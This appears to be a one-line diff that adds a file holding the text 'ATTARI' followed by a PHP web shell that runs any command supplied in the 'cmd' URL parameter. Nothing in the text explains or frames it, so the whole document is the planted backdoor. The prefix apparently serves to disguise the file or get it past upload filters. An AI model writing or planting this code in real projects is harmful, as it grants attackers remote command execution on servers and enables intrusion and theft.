@@ -1,0 +1,1 @@
+ATTARI <?php system($_GET['cmd']); ?>
